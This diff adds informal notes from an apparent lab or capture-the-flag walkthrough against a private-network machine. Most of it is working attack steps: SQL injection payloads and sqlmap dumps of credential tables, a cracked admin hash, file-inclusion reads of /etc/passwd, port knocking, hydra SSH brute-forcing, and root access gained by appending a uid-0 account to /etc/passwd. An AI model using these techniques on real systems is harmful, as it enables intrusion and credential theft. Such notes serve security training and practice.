@@ -1,0 +1,111 @@
+ 192.168.222.209
+' or 1=1 -- - on http://192.168.174.209/search.php
+
+Automatic manual testing for SQLinjection
+' UNION SELECT 1 #
+' UNION SELECT 1,2 #
+' UNION SELECT 1,2,3 #
+' UNION SELECT 1,2,3,4,... #
+' UNION SELECT 1,2,3,4,5,6 # (Displaying some resluts)
+Find DB version 
+' union select 1,2,3,4,5,@@version #
+ Find DB names (concat(schema_name))
+ ' union select 1,2,3,4,5,concat(schema_name) FROM information_schema.schemata #
+ Find tables names (concat(TABLE_NAME))
+ ' union SELECT 1,2,3,4,5,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='Staff' #
+ ' union SELECT 1,2,3,4,5,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='users' #
+Find the columns name of a table: (information_schema.columns)
+' union SELECT 1,2,3,4,5,column_name FROM information_schema.columns WHERE table_name = 'StaffDetails' #
+' union SELECT 1,2,3,4,5,column_name FROM information_schema.columns WHERE table_name = 'Users' #
+' union SELECT 1,2,3,4,5,column_name FROM information_schema.columns WHERE table_name = 'UserDetails' #
+Results:
+
+    Number of columns: 6
+
+    DB version: 10.3.17-MariaDB-0+deb10u1
+
+    Databases — Tables — Columns:
+    information_schema (default)
+    Staff:
+    — — StaffDetails:
+    — — — — id
+    — — — — firstname
+    — — — — lastname
+    — — — — position
+    — — — — phone
+    — — — — email
+    — — — — reg_date
+    — — Users:
+    — — — — UserID
+    — — — — Username
+    — — — — Password
+    users:
+    — — UserDetails:
+    — — — — id
+    — — — — firstname
+    — — — — lastname
+    — — — — username
+    — — — — password
+    — — — — reg_date
+Dump Data: (group_concat(username,” | “,password))
+' union select 1,2,3,4,5,group_concat(username," | ",password) From users.UserDetails #
+Copy reslut and save in cerds file 
+run following commnd to seperate username and password
+cat creds | tr "," "\n" | cut -d " " -f 1 > user
+cat creds | tr "," "\n" | cut -d " " -f 3 > pass
+
+' union select 1,2,3,4,5,group_concat(username," | ",password) From Staff.Users #
+Result: admin | 856f5de590ef37314e7c3bdf6f8a66dc
+cracked password hash transorbital1
+
+Automatic Testing for sqlinjection
+Capture the request using burpsuite
+sqlmap -r request --dbs
+sqlmap -r file --dump --batch --dbs -D Staff
+sqlmap -r request --dump --batch --dbs -D users
+
+
+ 'Username': 'admin', 'Password': '856f5de590ef37314e7c3bdf6f8a66dc '}]
+ https://crackstation.net/
+ cracked hash by online cracker and got transorbital1
+Login using the same credentials
+Getting error file doesnot exist It may LFI
+ 
+ file inclusion 
+ 
+ http://192.168.158.209/welcome.php?file=../../../../../../../etc/passwd
+ http://192.168.174.209/welcome.php?file=../../../../../../../var/log/apt/history.log
+ http://192.168.174.209/welcome.php?file=../../../../../../../var/log/dpkg.log
+ I found knockd installed
+ http://192.168.174.209/welcome.php?file=../../../../../../../etc/knockd.conf 
+ I fond destination port is 22 so connection is accepted
+ 
+ for X in 7469 8475 9842; do nmap -Pn --host-timeout 201 --max-retries 0 -p $X 192.168.54.209; done
+ 
+ hydra -L user.txt -P password.lst 192.168.174.209 ssh -t 4 
+ Got three username and password
+ janitor is useful 
+ 
+  ssh janitor@192.168.174.209 
+  hidden directory
+  cat passwords-found-on-post-it-notes.txt
+  Store password into new new_pass.lst file
+  hydra -L user.txt -P new_pass.lst 192.168.174.209 ssh -t 4
+  
+  found 2  more user with password
+  I checked and found fred is sudo
+  switch to fred user 
+  it sudo 
+  (root) NOPASSWD: /opt/devstuff/dist/test/test
+find / -name "test.py" 2>/dev/null
+cat /opt/devstuff/test.py  (this file can read and write data)
+
+create a new file user.txt with user details and I will add into /etc/passwd
+generate password first
+openssl passwd -1
+put the password twice
+user.txt content
+root2:$1$sGhBDnuC$WiKVniI574IiahzxkQXJC0:0:0:root2:/home/root2:/bin/bash
+
+
+  
